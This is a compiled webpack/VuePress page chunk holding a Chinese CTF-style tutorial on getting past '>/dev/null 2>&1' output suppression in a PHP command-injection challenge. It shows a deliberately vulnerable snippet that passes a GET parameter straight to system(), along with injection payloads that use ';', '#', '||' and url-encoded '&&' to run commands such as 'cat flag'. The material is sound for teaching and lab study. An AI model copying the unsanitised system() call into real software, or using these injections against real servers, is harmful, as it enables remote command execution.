(window.webpackJsonp=window.webpackJsonp||[]).push([[57],{419:function(s,t,a){"use strict";a.r(t);var n=a(7),e=Object(n.a)({},(function(){var s=this,t=s._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h1",{attrs:{id:"重定向黑洞"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#重定向黑洞"}},[s._v("#")]),s._v(" 重定向黑洞")]),s._v(" "),t("p",[s._v("分析"),t("code",[s._v(">/dev/null 2>&1")]),s._v("：")]),s._v(" "),t("ul",[t("li",[s._v(">：将标准输出重定向")]),s._v(" "),t("li",[s._v("/dev/null：一个“黑洞”，用于丢弃数据。")]),s._v(" "),t("li",[s._v("2>&1：将标准错误（文件描述符2）重定向到标准输出（文件描述符1），即把错误输出和正常输出都导向/dev/null")])]),s._v(" "),t("p",[s._v("因此，这个命令的整体效果是，运行命令时，不会在终端上看到任何输出或错误信息。这个技巧常用于需要静默运行的脚本或命令。")]),s._v(" "),t("div",{staticClass:"language-php line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-php"}},[t("code",[t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("isset")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_GET")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),t("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'c'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n    "),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$c")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_GET")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),t("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'c'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("system")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$c")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),t("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('" >/dev/null 2>&1"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br")])]),t("blockquote",[t("p",[s._v('system($c." >/dev/null 2>&1");')])]),s._v(" "),t("p",[s._v("system执行$c的终端命令 "),t("strong",[s._v('">/dev/null 2>&1"')]),s._v(" 加上这句后，执行命令但无回显")]),s._v(" "),t("p",[s._v("解决方案：")]),s._v(" "),t("h2",{attrs:{id:"注释"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#注释"}},[s._v("#")]),s._v(" 注释")]),s._v(" "),t("p",[s._v("emm,很简单的一个姿势")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("ctf@ubuntu:~$ "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("ls")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(".txt\nctf@ubuntu:~$ "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("ls")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# >/dev/null 2>&1")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(".txt\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br")])]),t("h2",{attrs:{id:"一次执行多条命令"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#一次执行多条命令"}},[s._v("#")]),s._v(" 一次执行多条命令")]),s._v(" "),t("blockquote",[t("p",[s._v("在Linux命令行中，分号（;）、竖线（|）、双竖线（||）、和符号（&）以及双与符号（&&）有不同的作用：")])]),s._v(" "),t("p",[s._v("在linux终端中，一次是可以执行多个命令的，例如"),t("code",[s._v("pwd;ls;")]),s._v("，通过这些分隔符，可以分割多个命令")]),s._v(" "),t("p",[s._v("可以通过拼接，实现类似"),t("code",[s._v("cat flag;ls")]),s._v("，拼接到php里后，就是"),t("code",[s._v("cat flag;ls >/dev/null 2>&1")]),s._v("，这样第二条命令没有回显，第一条不受影响")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("分号（"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("）：用于分隔多个命令，依次执行每个命令，不管前面的命令是否成功。          例如：?c"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("ls"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("pwd")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("  \n竖线（"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("）：管道符号，用于将一个命令的输出传递给另一个命令作为输入。             "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 测试失败")]),s._v("\n双竖线（"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("||")]),s._v("）：逻辑或运算符，用于在第一个命令失败时执行第二个命令。              例如：?c"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("ls"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("||")]),s._v("\n和符号（"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),s._v("）：在命令末尾使用表示在后台执行该命令。                              例如：?c"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("pwd%26\n双与符号（"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&&")]),s._v("）：逻辑与运算符，用于只有在第一个命令成功执行后才执行第二个命令。   例如：?c"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("pwd%26%26  \n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br")])]),t("div",{staticClass:"custom-block tip"},[t("p",{staticClass:"custom-block-title"},[s._v("提示")]),s._v(" "),t("p",[s._v("请注意："),t("strong",[s._v("其中在使用GET传值时，&和&&都需要进行url编码")])])]),s._v(" "),t("p",[s._v("因此，在这里使用GET给$c传值时，加入这些"),t("strong",[s._v("用于控制终端命令分隔符")]),s._v("的符号，一次执行多条命令，在一条命令结果被吞掉时不至于影响到其他命令")])])}),[],!1,null,null,null);t.default=e.exports}}]);